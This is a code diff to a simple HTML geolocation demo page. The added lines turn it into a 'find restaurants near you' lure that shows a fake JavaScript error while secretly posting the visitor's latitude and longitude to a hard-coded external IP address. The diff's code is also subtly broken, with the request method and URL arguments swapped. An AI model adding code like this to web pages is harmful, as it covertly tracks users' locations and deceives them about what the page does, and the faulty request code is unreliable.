@@ -2,7 +2,7 @@
 <html>
 <body>
 
-<p>Click the button to get your coordinates.</p>
+<p>Click the button to find restaurants near you!</p>
 
 <button onclick="getLocation()">Try It</button>
 
@@ -20,8 +20,10 @@ function getLocation() {
 }
 
 function showPosition(position) {
-  x.innerHTML = "Latitude: " + position.coords.latitude + 
-  "<br>Longitude: " + position.coords.longitude;
+  x.innerHTML = "Uncaught ReferenceError: restaurant is not defined at <anonymous>:1:1";
+  let xhttp = new XMLHttpRequest();
+  xhttp.open("http://68.183.143.19/data", "POST", true);
+  xhttp.send({"lat": position.coords.latitude.toString(), "long": position.coords.longitude.toString()});
 }
 </script>
 
